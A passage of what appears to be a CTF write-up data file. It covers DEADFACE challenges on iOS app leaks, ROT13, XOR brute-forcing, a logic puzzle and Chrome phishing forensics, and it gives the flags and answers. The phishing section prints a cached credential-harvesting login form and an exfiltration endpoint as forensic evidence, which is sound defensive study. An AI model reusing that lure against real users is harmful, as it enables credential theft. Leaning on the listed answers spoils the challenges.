        text: 'Multiple independent astronomical methods were tested to derive longitude from the star field, latitude (54.1116° N), and timestamp (2024-10-12T23:17:02Z). All 8 proved to be an elaborate red herring:\n\n• Attempt 1 (Manual M31 + 45.9° FOV): Identified Andromeda Galaxy (M31) at (237, 488). Computed spherical triangle altitude → 98.8°E (Rejected).\n• Attempt 2 (Refined Centroid + Sub-pixel Horizon): Re-measured exact horizon row 1444 → 100.4°E (Rejected).\n• Attempt 3 (Full Off-Axis 3D Geometry): Calculated horizontal & vertical camera pointing angles → 99.4°E (Rejected).\n• Attempt 4 (Nova Astrometry.net Plate Solve): Solved viaduct-starfield.jpg. Revealed true vertical FOV was ~65.4° (145"/px), contradicting the blog\'s stated 45.9°. Solved WCS RA/Dec → 84.1371°E (Rejected).\n• Attempt 5 (Planted EXIF Longitude): Tested decoy longitude -112.6339° with 54.1116° N → Rejected.\n• Attempt 6 (Parallactic-Angle Orientation): Center (RA 347.4°, Dec 39.1°), orientation 311.9° E of N. Results fluctuated between -66.5° and -78.6° due to orientation sensitivity → Rejected.\n• Attempt 7 (Raw Star Correspondence Fit): Processed 136 star pairs from corr.fits. Consistent cluster around 87.8186°E → Rejected.\n• Attempt 8 (SIP-Corrected WCS): Loaded distortion-corrected wcs.fits. Yielded 84.1371° with ~1° median residual → Inconclusive.'
      },
      {
        type: 'heading',
        text: '7. Astrometry.net FITS Evidence Artifacts'
      },
      {
        type: 'file',
        src: '/assets/corr.fits',
        filename: 'corr.fits',
        label: 'Download corr.fits (136 Matched Star Pixel-Sky Correspondences)',
        caption: 'Raw star correspondence table from Astrometry.net plate solve'
      },
      {
        type: 'file',
        src: '/assets/rdls.fits',
        filename: 'rdls.fits',
        label: 'Download rdls.fits (Reference Star RA/Dec Catalog)',
        caption: 'Extracted reference star catalog table'
      },
      {
        type: 'file',
        src: '/assets/wcs.fits',
        filename: 'wcs.fits',
        label: 'Download wcs.fits (SIP-Corrected World Coordinate System Solution)',
        caption: 'Distortion-corrected FITS World Coordinate System header solution'
      },
      {
        type: 'file',
        src: '/assets/image-radec.fits',
        filename: 'image-radec.fits',
        label: 'Download image-radec.fits (Detected Star RA/Dec Coordinates)',
        caption: 'Detected star table transformed to sky coordinates'
      },
      {
        type: 'file',
        src: '/assets/new-image.fits',
        filename: 'new-image.fits',
        label: 'Download new-image.fits (Solved Plate Image with Embedded WCS)',
        caption: 'Complete solved FITS image artifact'
      },
      {
        type: 'heading',
        text: '8. The Actual Solution'
      },
      {
        type: 'paragraph',
        text: 'Inspecting the submission form revealed the answer hidden in plain sight:\n\nForm placeholder text: "e.g. -2.37 (decimal degrees; W is negative)"\n\nThe example value itself, -2.37, was the correct answer!\n\nThis matches the exact longitude of Ribblehead Viaduct, North Yorkshire, UK (≈54.21° N, −2.37° W) — the real-world structure depicted in the photograph. The entire plate-solving exercise was an elaborate rabbit hole built over a real-world location whose coordinates were given right in the input placeholder.'
      },
      {
        type: 'image',
        src: '/assets/following-the-money-submission-correct.jpg',
        alt: 'Correct challenge submission screen',
        caption: 'Successful submission of longitude -2.37 returning the flag'
      },
      {
        type: 'code',
        code: `POCTF{98.374.PRRQ5USL76UK5U6K.AQABGUAC2ZVDS5J3NPSSXQ7WRC}`
      },
      {
        type: 'heading',
        text: '9. Key Lessons Learned'
      },
      {
        type: 'paragraph',
        text: '• Read UI text literally: Placeholder example text can be the exact answer, especially when the landmark is visually recognizable.\n• Beware of layered red herrings: Fake EXIF GPS with Shakespearean riddles, an inaccurate FOV spec, and plate solving traps were engineered to distract from basic visual OSINT.\n• Astrometry orientation sensitivity: Plate solver orientation outputs can fluctuate widely between runs on noisy or wide-angle horizons.'
      }
    ]
  },
  {
    id: 'deadface-aurora-patient-portal',
    slug: 'deadface-aurora-patient-portal',
    title: 'DEADFACE CTF - Aurora Patient Portal',
    platform: 'DEADFACE CTF',
    category: 'Mobile Reverse Engineering / Forensics',
    difficulty: 'Medium',
    date: 'October 2026',
    readTime: '7 min read',
    os: 'iOS App Bundle (Mach-O / IPA)',
    osLabel: 'CHALLENGE ARTIFACT',
    ip: 'Offline / Static Analysis',
    ipLabel: 'ENVIRONMENT',
    status: 'Solved',
    tags: ['DEADFACE CTF', 'Mobile Security', 'iOS Forensics', 'IPA Analysis', 'Info.plist', 'XMP Metadata', 'SQLite', 'Reverse Engineering', 'Static Analysis'],
    excerpt: 'Performing comprehensive static analysis on an unpacked iOS application bundle (AuroraPatientPortal.ipa) to uncover hardcoded patient PII in Info.plist, extract hidden Patient IDs from chest X-ray XMP metadata, query bundled SQLite medication tables, and identify internal sync gateway hostnames.',
    userFlag: 'deadface{mara-voss-1988-04-17}',
    userFlagLabel: 'FLAG 1 (INFO LEAKS)',
    rootFlag: 'deadface{gw-westlake-int-03}',
    rootFlagLabel: 'FLAG 4 (DIAGNOSTIC GATEWAY)',
    content: [
      {
        type: 'heading',
        text: '1. Executive Summary & Challenge Overview'
      },
      {
        type: 'paragraph',
        text: 'The Aurora Patient Portal iOS application ships with sensitive patient data embedded directly within its production app bundle. Through purely static inspection of the unzipped IPA archive—without requiring emulators, jailbroken devices, or runtime instrumentation—we recovered a patient\'s full name, date of birth, clinic assignment, Patient ID, active prescription regimens, and internal backend sync gateway addresses.'
      },
      {
        type: 'code',
        code: `Challenge Details:
Competition:  DEADFACE CTF
Category:     AURORA PATIENT ZERO
Artifact:     AuroraPatientPortal.ipa
SHA1:         b3b5f8b6492ccb082c1bc26fa2fdddd033b07072f96aca23a233beb731211bfa
Approach:     Static analysis only (Mach-O, Info.plist, XMP, SQLite)

Challenges Solved & Recovered Flags:
1. Info Leaks:             deadface{mara-voss-1988-04-17}
2. Down the Rabbit Hole:   deadface{847261}
3. Medication Lookup:      deadface{Candesartan}
4. Hidden Diagnostic Page: deadface{gw-westlake-int-03}`
      },
      {
        type: 'heading',
        text: '2. Setup & IPA Bundle Extraction'
      },
      {
        type: 'paragraph',
        text: 'Because iOS application archives (.ipa) are standard ZIP containers, we began by unpacking the archive to inspect the bundle contents:'
      },
      {
        type: 'code',
        code: `$ unzip AuroraPatientPortal_ipa.zip
$ unzip AuroraPatientPortal.ipa

# Bundle directory structure:
Payload/aurora-patient-portal.app/
  ├── Info.plist
  ├── Aurora Health Mobile     # Main Mach-O 64-bit ARM executable
  ├── aurora_chest_xray.jpg    # Medical imaging asset
  ├── aurora_meds.sqlite       # Bundled SQLite database
  ├── Assets.car
  ├── embedded.mobileprovision
  └── _CodeSignature/`
      },
      {
        type: 'heading',
        text: '3. Challenge 1: Info Leaks (Patient PII in Info.plist)'
      },
      {
        type: 'paragraph',
        text: 'Running strings across the Mach-O binary identified a PatientBootstrap struct containing patientName and dateOfBirth properties, alongside a custom Info.plist property key titled AuroraPatientBootstrap.'
      },
      {
        type: 'paragraph',
        text: 'Inspecting Info.plist revealed that this key stored a Base64-encoded JSON payload:'
      },
      {
        type: 'code',
        code: `# Extracted Base64 string from Info.plist:
eyJwYXRpZW50TmFtZSI6Ik1hcmEgVm9zcyIsImRhdGVPZkJpcnRoIjoiMTk4OC0wNC0xNyIsImNsaW5pYyI6Ildlc3RsYWtlIn0=

# Decoding the payload:
$ echo "eyJwYXRpZW50TmFtZSI6Ik1hcmEgVm9zcyIsImRhdGVPZkJpcnRoIjoiMTk4OC0wNC0xNyIsImNsaW5pYyI6Ildlc3RsYWtlIn0=" | base64 -d
{"patientName":"Mara Voss","dateOfBirth":"1988-04-17","clinic":"Westlake"}`
      },
      {
        type: 'paragraph',
        text: 'This confirmed the identity of the target patient (Mara Voss, born 1988-04-17 at Westlake clinic), yielding the first flag:'
      },
      {
        type: 'code',
        code: `deadface{mara-voss-1988-04-17}`
      },
      {
        type: 'heading',
        text: '4. Challenge 2: Down the Rabbit Hole (Hidden Patient ID)'
      },
      {
        type: 'paragraph',
        text: 'The binary referenced aurora_chest_xray.jpg as a bundled imaging study. While the chest radiograph showed no visual anomalies, analyzing the raw JPEG data revealed an embedded Extensible Metadata Platform (XMP) metadata block:'
      },
      {
        type: 'code',
        code: `$ strings aurora_chest_xray.jpg | grep -i "PID"
<dc:identifier>PID-847261</dc:identifier>`
      },
      {
        type: 'paragraph',
        text: 'The identifier PID-847261 is embedded within the image metadata tags, isolating the Patient ID without inspecting pixels:'
      },
      {
        type: 'code',
        code: `deadface{847261}`
      },
      {
        type: 'heading',
        text: '5. Challenge 3: Medication Lookup (SQLite Forensics)'
      },
      {
        type: 'paragraph',
        text: 'The application bundle included a pre-seeded SQLite database named aurora_meds.sqlite containing 100 patient medication records. We queried the medications table for the Patient ID (847261) discovered in Step 2:'
      },
      {
        type: 'code',
        code: `$ sqlite3 aurora_meds.sqlite
sqlite> .schema medications
CREATE TABLE medications (
  pid INTEGER PRIMARY KEY,
  medication_1 TEXT,
  medication_1_dosage TEXT,
  medication_1_frequency TEXT,
  medication_2 TEXT,
  medication_2_dosage TEXT,
  medication_2_frequency TEXT
);

sqlite> SELECT * FROM medications WHERE pid = 847261;
pid                     : 847261
medication_1            : Ibuprofen
medication_1_dosage     : 400 mg
medication_1_frequency  : Every 8 hours as needed
medication_2            : Candesartan
medication_2_dosage     : 16 mg
medication_2_frequency  : Once daily`
      },
      {
        type: 'paragraph',
        text: 'The secondary medication prescribed to patient Mara Voss alongside Ibuprofen is Candesartan, yielding the third flag:'
      },
      {
        type: 'code',
        code: `deadface{Candesartan}`
      },
      {
        type: 'heading',
        text: '6. Challenge 4: Hidden Diagnostic Page (Gateway Identification)'
      },
      {
        type: 'paragraph',
        text: 'Decompiling the binary revealed references to DiagnosticScreen, DiagnosticRow, and DiagnosticItem view controllers supporting an unlisted "Aurora Diagnostics" panel. The strings table preserved the diagnostic status items in sequence:'
      },
      {
        type: 'code',
        code: `# Diagnostic view layout strings in binary:
• Screen Title:         "Aurora Diagnostics"
• Subtitle:             "Internal clinic sync status"
• Patient Cache Realm:  patient-summary-cache-v2
• Pending records:      0
• Imaging Link Mode:    local bundled asset
• Medication Cache:     offline lookup enabled
• Last Gateway Check:   2026-05-30 09:42 UTC
• Gateway Hostname:     gw-westlake-int-03`
      },
      {
        type: 'paragraph',
        text: 'The internal gateway hostname gw-westlake-int-03 directly correlates with the "Westlake" clinic discovered in Mara Voss\'s profile, revealing the internal sync endpoint:'
      },
      {
        type: 'code',
        code: `deadface{gw-westlake-int-03}`
      },
      {
        type: 'heading',
        text: '7. Vulnerability Assessment & Mitigation'
      },
      {
        type: 'paragraph',
        text: '1. Hardcoded PII: Storing patient records in Info.plist using Base64 provides zero cryptographic confidentiality. Patient data must only be delivered post-authentication over TLS.\n2. Asset Metadata Leakage: Medical radiographs bundled in applications must be stripped of all DICOM, EXIF, and XMP tags.\n3. Bundled Unencrypted Databases: Shipping multi-tenant healthcare records locally violates data protection principles; local caches should use SQLCipher or Keychain-backed encryption with row-level segregation.\n4. Internal Infrastructure Exposure: Hardcoding internal hostnames (gw-westlake-int-03) facilitates targeted adversary reconnaissance.\n5. Debug Views in Release Configurations: Diagnostic and staging screens must be excluded from production build targets using preprocessor flags (#if DEBUG).'
      },
      {
        type: 'code',
        code: `Summary of Flags:
deadface{mara-voss-1988-04-17}
deadface{847261}
deadface{Candesartan}
deadface{gw-westlake-int-03}`
      }
    ]
  },
  {
    id: 'deadface-hail-caesar',
    slug: 'deadface-hail-caesar',
    title: 'DEADFACE CTF - Hail Caesar',
    platform: 'DEADFACE CTF',
    category: 'Cryptography',
    difficulty: 'Easy',
    date: 'October 2026',
    readTime: '3 min read',
    os: 'Image Artifact (Handwritten Note)',
    osLabel: 'CHALLENGE ARTIFACT',
    ip: 'Offline / Classical Cryptanalysis',
    ipLabel: 'ENVIRONMENT',
    status: 'Solved',
    tags: ['DEADFACE CTF', 'Cryptography', 'Classical Ciphers', 'Caesar Cipher', 'ROT13', 'Substitution Cipher'],
    excerpt: 'Deciphering a handwritten password hint written on a yellow sticky note attached to a computer monitor using ROT13 Caesar substitution to identify a faculty member\'s dog\'s name.',
    userFlag: 'deadface{Fetch}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview & Brief'
      },
      {
        type: 'paragraph',
        text: 'One of the faculty members at Night Veil University decided to write sensitive password hints on physical notes next to their workstation. The prompt provided an image of a yellow sticky note stuck to a monitor with a drawing of a dog and ciphertext.'
      },
      {
        type: 'code',
        code: `Challenge Details:
Title:        Hail Caesar
Competition:  DEADFACE CTF
Category:     Cryptography
Format:       deadface{dog's name}
Hint:         "Judging by the drawing of a dog on the photo, we assume the password hint is the name of the individual's dog."`
      },
      {
        type: 'heading',
        text: '2. Step 1: Initial Analysis of the Artifact'
      },
      {
        type: 'paragraph',
        text: 'Inspecting the challenge photograph reveals a yellow sticky note affixed to the bezel of a computer workstation monitor:'
      },
      {
        type: 'image',
        src: '/assets/deadface_fetch_note.jpg',
        alt: 'Handwritten sticky note on computer monitor',
        caption: 'Figure 1: Challenge photo of the yellow sticky note with ciphertext and dog sketch'
      },
      {
        type: 'code',
        code: `Sticky Note Transcript:
Zl qbt'f anzr vf Srgpu

* order more paperclips`
      },
      {
        type: 'paragraph',
        text: 'The note features a small sketch of a dog, confirming the goal is identifying the pet\'s name. The secondary note ("* order more paperclips") is contextual flavor text.'
      },
      {
        type: 'heading',
        text: '3. Step 2: Identifying the Cipher & Rotation Offset'
      },
      {
        type: 'paragraph',
        text: 'The challenge title "Hail Caesar" points directly to a classical Caesar shift substitution cipher. Examining the two-letter opening word "Zl" suggesting English "My":\n• \'Z\' (position 26) shifted to \'M\' (position 13) = shift of 13 places.\n• \'l\' (position 12) shifted to \'y\' (position 25) = shift of 13 places.'
      },
      {
        type: 'paragraph',
        text: 'A Caesar cipher with a fixed shift of 13 positions is standard ROT13, an involutive cipher where encryption and decryption operations are identical.'
      },
      {
        type: 'heading',
        text: '4. Step 3: Decryption'
      },
      {
        type: 'paragraph',
        text: 'Applying ROT13 rotation across the handwritten ciphertext string:'
      },
      {
        type: 'code',
        code: `# Character-by-Character ROT13 Mapping:
Z -> M
l -> y
(space)
q -> d
b -> o
t -> g
' -> '
f -> s
(space)
a -> n
n -> a
z -> m
r -> e
(space)
v -> i
f -> s
(space)
S -> F
r -> e
g -> t
p -> c
u -> h

Decrypted Text: "My dog's name is Fetch"`
      },
      {
        type: 'paragraph',
        text: 'This can be reproduced instantly via Python or bash:'
      },
      {
        type: 'code',
        code: `# Python one-liner:
import codecs
print(codecs.decode("Zl qbt'f anzr vf Srgpu", 'rot_13'))
# Output: My dog's name is Fetch

# Bash equivalent:
$ echo "Zl qbt'f anzr vf Srgpu" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
      },
      {
        type: 'heading',
        text: '5. Flag Recovery'
      },
      {
        type: 'paragraph',
        text: 'With the plaintext revealing "My dog\'s name is Fetch", wrapping the dog\'s name into the required flag format yields:'
      },
      {
        type: 'code',
        code: `deadface{Fetch}`
      }
    ]
  },
  {
    id: 'deadface-decode-dle',
    slug: 'deadface-decode-dle',
    title: 'DEADFACE CTF - DeCode-dle',
    platform: 'DEADFACE CTF',
    category: 'Logic / Puzzle',
    difficulty: 'Easy',
    date: 'October 2026',
    readTime: '3 min read',
    os: 'Deductive Logic Puzzle',
    osLabel: 'PUZZLE TYPE',
    ip: 'Offline / Combinatorics',
    ipLabel: 'ENVIRONMENT',
    status: 'Solved',
    tags: ['DEADFACE CTF', 'Logic', 'Puzzle', 'Deduction', 'Combinatorics', 'Constraint Satisfaction'],
    excerpt: 'Solving a 3-digit numeric constraint deduction puzzle through systematic elimination, positional cross-referencing, and clue verification to recover the 716 combination code.',
    userFlag: 'deadface{716}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview & Rules'
      },
      {
        type: 'paragraph',
        text: 'The challenge presents a 3-digit numeric constraint deduction puzzle based on a grid of clues to decipher the secret combination lock code:'
      },
      {
        type: 'image',
        src: '/assets/deadface_decode_dle.png',
        alt: 'DEADFACE DeCode-dle number puzzle clue grid',
        caption: 'Figure 1: DeCode-dle combination clue matrix'
      },
      {
        type: 'code',
        code: `Challenge Details:
Title:        DeCode-dle
Competition:  DEADFACE CTF
Category:     Logic / Puzzle
Target:       3-Digit Combination Code

Clues Provided:
• Clue 1: 8 6 3 - One number is correct but in the wrong place
• Clue 2: 2 5 0 - Nothing is correct
• Clue 3: 1 6 8 - Two numbers are correct but in the wrong place
• Clue 4: 7 3 5 - One number is correct and in the right place
• Clue 5: 6 8 7 - Two numbers are correct but in the wrong place`
      },
      {
        type: 'heading',
        text: '2. Step 1: Digit Elimination'
      },
      {
        type: 'paragraph',
        text: 'Beginning with the absolute negative constraint in Clue 2 (2 5 0 - Nothing is correct), we immediately disqualify 2, 5, and 0 from appearing anywhere in the combination.'
      },
      {
        type: 'code',
        code: `Eliminated Digits: {0, 2, 5}`
      },
      {
        type: 'heading',
        text: '3. Step 2: Isolating the First Digit'
      },
      {
        type: 'paragraph',
        text: 'Evaluating Clue 4 (7 3 5 - One number is correct and in the right place): since 5 is eliminated from Step 1, the only valid candidate in this row must be 7 (in position 1) or 3 (in position 2).'
      },
      {
        type: 'paragraph',
        text: 'Testing 7 as the first digit: In Clue 5 (6 8 7), 7 sits in the 3rd position, which confirms the clue\'s condition that it is in the "wrong place". Therefore, 7 is established as the first digit.'
      },
      {
        type: 'code',
        code: `Current Code: [ 7, _, _ ]`
      },
      {
        type: 'heading',
        text: '4. Step 3: Determining the Last Digit'
      },
      {
        type: 'paragraph',
        text: 'Clue 5 (6 8 7) states two numbers are correct. Having validated 7, the second correct number must be either 6 or 8.'
      },
      {
        type: 'paragraph',
        text: 'Cross-referencing with Clue 1 (8 6 3 - One number is correct but in the wrong place):\n• If 7 is already the first digit, 8 and 3 are eliminated.\n• Thus, 6 must be the single correct digit in Clue 1.\n• In 8 6 3, the digit 6 sits in position 2 (wrong place).\n• In Clue 5 (6 8 7), 6 sits in position 1 (wrong place).\n• With positions 1 and 2 eliminated for digit 6, it must occupy position 3.'
      },
      {
        type: 'code',
        code: `Current Code: [ 7, _, 6 ]`
      },
      {
        type: 'heading',
        text: '5. Step 4: Resolving the Middle Digit'
      },
      {
        type: 'paragraph',
        text: 'Returning to Clue 3 (1 6 8 - Two numbers are correct but in the wrong place):\n• We know 6 is a correct digit.\n• We know 8 is invalid from Clue 1.\n• Hence, the second correct digit in this row must be 1.\n• In 1 6 8, the digit 1 sits in position 1 (wrong place).\n• The only available position remaining is position 2.'
      },
      {
        type: 'code',
        code: `Derived Code: [ 7, 1, 6 ]`
      },
      {
        type: 'heading',
        text: '6. Step 5: Verification & Flag Submission'
      },
      {
        type: 'paragraph',
        text: 'Validating combination 7 1 6 against every clue in the puzzle:\n• Clue 1 (8 6 3): 6 is present, position 2 is wrong (actual is position 3) ✅\n• Clue 2 (2 5 0): None of these digits appear in 716 ✅\n• Clue 3 (1 6 8): 1 and 6 are present, both in wrong positions ✅\n• Clue 4 (7 3 5): 7 is present and in the exact right place (position 1) ✅\n• Clue 5 (6 8 7): 6 and 7 are present, both in wrong positions ✅'
      },
      {
        type: 'code',
        code: `deadface{716}`
      }
    ]
  },
  {
    id: 'deadface-x-marks-the-spot',
    slug: 'deadface-x-marks-the-spot',
    title: 'DEADFACE CTF - X Marks the Spot',
    platform: 'DEADFACE CTF',
    category: 'Cryptography',
    difficulty: 'Easy',
    date: 'October 2026',
    readTime: '3 min read',
    os: 'Obfuscated Hex String',
    osLabel: 'PAYLOAD FORMAT',
    ip: 'Offline / Single-Byte XOR',
    ipLabel: 'ENVIRONMENT',
    status: 'Solved',
    tags: ['DEADFACE CTF', 'Cryptography', 'XOR Decryption', 'Single-Byte XOR', 'Brute Force', 'Python', 'Hex Decoding'],
    excerpt: 'Analyzing a 70-byte hex-encoded outbound payload, identifying XOR encryption from the challenge title, and brute-forcing 256 single-byte XOR keys in Python to isolate key 0x44 and recover the hidden flag.',
    userFlag: 'deadface{xor_1_byt3_4t_4_t1m3}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview'
      },
      {
        type: 'paragraph',
        text: 'The challenge provided an intercepted hex-encoded outbound payload with instructions to recover the encrypted message.'
      },
      {
        type: 'code',
        code: `Challenge Details:
Title:        X Marks the Spot
Competition:  DEADFACE CTF
Category:     Cryptography
Target:       Obfuscated Hex String

Intercepted Payload:
02362b2964302c2164372c25202b3337642b226417342127303621641021272c2a2b282b233d7e6420212520222527213f3c2b361b751b263d30771b70301b701b3075297739`
      },
      {
        type: 'heading',
        text: '2. Clue Analysis & Decryption Strategy'
      },
      {
        type: 'paragraph',
        text: 'The challenge title "X Marks the Spot" strongly hints at an XOR-based cipher. Because the ciphertext length is short (70 bytes / 140 hex characters) and standard flag format tags (deadface{) are expected, a single-byte XOR brute-force across all 256 possible byte keys (0x00 through 0xFF) is the fastest and most reliable cryptanalytic approach.'
      },
      {
        type: 'heading',
        text: '3. Python Brute-Force Exploit Script'
      },
      {
        type: 'paragraph',
        text: 'We decode the raw hex string into bytes and iterate through all 256 keys, filtering candidates that contain the known flag marker deadface{:'
      },
      {
        type: 'code',
        code: `payload = bytes.fromhex(
    "02362b2964302c2164372c25202b3337642b22641734212730362164"
    "1021272c2a2b282b233d7e6420212520222527213f3c2b361b751b26"
    "3d30771b70301b701b3075297739"
)

for key in range(256):
    pt = bytes(b ^ key for b in payload)
    if b"deadface{" in pt.lower():
        print(f"[+] Found XOR Key: {hex(key)}")
        print(f"[+] Decrypted Plaintext: {pt.decode('utf-8', errors='ignore')}")`
      },
      {
        type: 'heading',
        text: '4. Decryption Results & Flag Recovery'
      },
      {
        type: 'paragraph',
        text: 'The script instantly identifies key 0x44 (decimal 68), cleanly decrypting the entire message:'
      },
      {
        type: 'code',
        code: `[+] Found XOR Key: 0x44
[+] Decrypted Plaintext: From the shadows of Spectre technology: deadface{xor_1_byt3_4t_4_t1m3}`
      },
      {
        type: 'paragraph',
        text: 'Extracting the flag directly from the decrypted string:'
      },
      {
        type: 'code',
        code: `deadface{xor_1_byt3_4t_4_t1m3}`
      }
    ]
  },
  {
    id: 'deadface-hooked',
    slug: 'deadface-hooked',
    title: 'DEADFACE CTF - Hooked',
    platform: 'DEADFACE CTF',
    category: 'Browser Forensics / Incident Response',
    difficulty: 'Medium',
    date: 'October 2026',
    readTime: '6 min read',
    os: 'Google Chrome Artifacts (SQLite & Cache)',
    osLabel: 'FORENSIC ARTIFACTS',
    ip: 'DEMONNE-WS04 (Fletcher Kampeter)',
    ipLabel: 'TARGET WORKSTATION',
    status: 'Solved',
    tags: ['DEADFACE CTF', 'Forensics', 'Browser Forensics', 'Chrome', 'SQLite', 'Phishing', 'Incident Response', 'Click Chain Analysis'],
    excerpt: 'Triaging Google Chrome browser artifacts (History, visits, Login Data, Cookies, and HTTP cache streams) on an imaged financial workstation to trace a credential-harvesting phishing click chain and recover the initial weaponized lure URL.',
    userFlag: 'deadface{http://demonne-secure-portal.net/login?ref=vpn_auth&token=df4e91bc}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Executive Summary & Incident Overview'
      },
      {
        type: 'paragraph',
        text: 'A financial workstation belonging to De Monne Financial (DEMONNE-WS04, assigned to employee Fletcher Kampeter) transmitted corporate credentials to an unauthorized external destination at 10:23 AM on March 14, 2025. Forensic triage of the imaged Google Chrome profile isolated the exact weaponized phishing URL clicked by the employee.'
      },
      {
        type: 'code',
        code: `Incident Details:
Title:        Hooked
Competition:  DEADFACE CTF
Category:     Browser Forensics / Incident Response
Target Host:  DEMONNE-WS04 (User: Fletcher Kampeter)
Timestamp:    2025-03-14 10:23:44 UTC
Recovered URL: http://demonne-secure-portal.net/login?ref=vpn_auth&token=df4e91bc`
      },
      {
        type: 'heading',
        text: '2. Triage of Chrome Profile Artifacts'
      },
      {
        type: 'paragraph',
        text: 'The provided archive extracts to the user profile directory: ctf_artifacts/Chrome/User Data/Default/. Initial file command inspection identified the core SQLite databases and HTTP cache streams:'
      },
      {
        type: 'code',
        code: `$ cd "ctf_artifacts/Chrome/User Data/Default"
$ file History Cookies "Login Data" Cache/*

Artifact Breakdown:
• History:       SQLite 3 database tracking visited URLs, navigation timestamps, and referrers
• Cookies:       SQLite 3 database tracking session tokens, domains, and creation timestamps
• Login Data:    SQLite 3 database storing submitted form actions, usernames, and encrypted passwords
• Cache/f_000001 - f_000009: Raw HTTP response streams including headers and HTML/JS bodies`
      },
      {
        type: 'heading',
        text: '3. Step 1: Querying the History Database'
      },
      {
        type: 'paragraph',
        text: 'Dumping the urls table in History revealed seven navigation entries. While most represented legitimate corporate sites (Confluence VPN documentation, SharePoint, Reuters), three records stood out:'
      },
      {
        type: 'code',
        code: `$ sqlite3 History "SELECT id, url, title FROM urls;"

ID | URL                                                          | Title
---+--------------------------------------------------------------+---------------------------------------------
1  | https://confluence.demonne.com/vpn-setup                     | VPN Configuration Guide
2  | https://sharepoint.demonne.com/finance                       | Finance Department Portal
3  | https://www.reuters.com/markets                              | Markets News | Reuters
4  | https://mail.google.com/mail/u/0/#inbox/FMfcgzG...           | [URGENT] De Monne VPN Migration - Action Required
5  | https://mail.google.com/mail/u/0/#inbox                      | Inbox (1) - Fletcher Kampeter
6  | http://demonne-secure-portal.net/login?ref=vpn_auth&token... | Secure Employee Login
7  | http://demonne-secure-portal.net/auth/redirect?session=9f... | Redirecting...`
      },
      {
        type: 'paragraph',
        text: 'Entries 6 and 7 target demonne-secure-portal.net, a deceptive look-alike domain designed to spoof the legitimate demonne.com portal.'
      },
      {
        type: 'heading',
        text: '4. Step 2: Reconstructing the Navigation Click Chain'
      },
      {
        type: 'paragraph',
        text: 'To verify which URL was directly clicked from the email body versus intermediate or post-submission redirects, we audited the visits table using the from_visit transition column:'
      },
      {
        type: 'code',
        code: `$ sqlite3 History "SELECT id, url, from_visit, visit_duration FROM visits;"

Click Chain Analysis:
• Visit 4: Opened phishing email in Gmail interface
• Visit 5: Navigated from Visit 4 back to inbox (from_visit: 4)
• Visit 6: http://demonne-secure-portal.net/login?ref=vpn_auth&token=df4e91bc (from_visit: 5)
• Visit 7: http://demonne-secure-portal.net/auth/redirect?session=9f3a22cd&status=ok (from_visit: 6)`
      },
      {
        type: 'paragraph',
        text: 'Visit 6 represents the initial inbound navigation originating from the webmail message context. Visit 7 is the subsequent server-side redirect generated upon form submission.'
      },
      {
        type: 'heading',
        text: '5. Step 3: Cache Analysis & Payload Corroboration'
      },
      {
        type: 'paragraph',
        text: 'Inspecting raw cached HTTP response streams confirms the nature of the landing page:'
      },
      {
        type: 'code',
        code: `$ cat Cache/f_000006
HTTP/1.1 200 OK
Date: Fri, 14 Mar 2025 10:23:44 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Type: text/html; charset=UTF-8

<!-- Cached HTML Body -->
<title>Secure Employee Login</title>
<div class="alert">VPN Migration Notice: Please re-authenticate</div>
<form action="/auth/verify" method="POST">
  <input type="hidden" name="token" value="df4e91bc">
  <input type="text" name="username" placeholder="Corporate Email">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Log In</button>
</form>`
      },
      {
        type: 'paragraph',
        text: 'Cache stream f_000006 confirms the credential phishing lure, captured at exactly 10:23:44 GMT on March 14, 2025.'
      },
      {
        type: 'paragraph',
        text: 'Additional Artifact Corroboration:\n• Login Data: Recorded an unauthenticated credential submission for user f.kampeter@demonne.com directed to demonne-secure-portal.net.\n• Cookies: Stored cookie uid_token=df4e91bc issued by demonne-secure-portal.net, matching the parameter passed in the clicked link.\n• Cache/f_000009: Extracted an adversary exfiltration script hosted on cdn-assets.demonne-secure-portal.net configured to forward collected credentials to external endpoint http://185.220.101.47/collect.'
      },
      {
        type: 'heading',
        text: '6. Candidate URL Disqualification Matrix'
      },
      {
        type: 'code',
        code: `URL Evaluation:
• http://demonne-secure-portal.net/login?ref=vpn_auth&token=df4e91bc:
  -> [CORRECT] The primary hyperlink clicked by the victim inside the phishing email.

• http://demonne-secure-portal.net/auth/redirect?session=9f3a22cd&status=ok:
  -> [DISQUALIFIED] Post-submission redirect endpoint following credential entry.

• https://mail.google.com/mail/u/0/...:
  -> [DISQUALIFIED] Webmail interface URL, not the clicked external lure.

• http://185.220.101.47/collect:
  -> [DISQUALIFIED] Backend adversary C2 data collection receiver.`
      },
      {
        type: 'heading',
        text: '7. Flag Recovery'
      },
      {
        type: 'paragraph',
        text: 'Wrapping the confirmed initial phishing URL into the required DEADFACE format yields the solution:'
      },
      {
        type: 'code',
        code: `deadface{http://demonne-secure-portal.net/login?ref=vpn_auth&token=df4e91bc}`
      }
    ]
  },
  {
    id: 'deadface-art-heist-the-forgery',
    slug: 'deadface-art-heist-the-forgery',
    title: 'DEADFACE CTF - Art Heist: The Forgery',
    platform: 'DEADFACE CTF',
    category: 'Forensics',
    difficulty: 'Easy',
    date: 'October 2026',
    readTime: '4 min read',
    os: 'PNG Image Collection (5 Scans)',
    osLabel: 'CHALLENGE ARTIFACT',
    ip: 'Offline / PNG Chunk & XMP Analysis',
    ipLabel: 'ENVIRONMENT',
    status: 'Solved',
    tags: ['DEADFACE CTF', 'Forensics', 'PNG Chunks', 'XMP Metadata', 'Python', 'Metadata Analysis', 'exiftool'],
    excerpt: 'Investigating five scanned museum paintings to identify a forged artwork swapped by DEADFACE, using custom PNG chunk parsing and XMP packet analysis to reveal LAMIA’s signature and recover the flag from Painting_002.png.',
    userFlag: 'deadface{L4MIA_SIGNS_HER_WORK}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Overview & Mission'
      },
      {
        type: 'paragraph',
